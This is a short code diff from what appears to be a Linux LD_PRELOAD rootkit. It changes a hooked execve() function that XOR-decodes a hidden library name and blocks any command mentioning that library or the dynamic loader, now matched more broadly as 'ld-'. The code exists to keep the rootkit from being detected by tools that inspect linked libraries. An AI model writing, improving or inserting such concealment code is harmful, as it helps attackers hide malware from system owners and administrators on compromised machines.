@@ -231,7 +231,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         char *lib_name = strdup(LIB_NAME); xor(lib_name);
         for(i=0; argv[i] != NULL;i++)
         {
-            if(strstr(argv[i], lib_name) || strstr(argv[i], "ld-2")) // strstr and not strcmp because it could be a full path
+            if(strstr(argv[i], lib_name) || strstr(argv[i], "ld-")) // strstr and not strcmp because it could be a full path
             {
                 CLEAN(lib_name);
                 errno = EPERM; return -1;
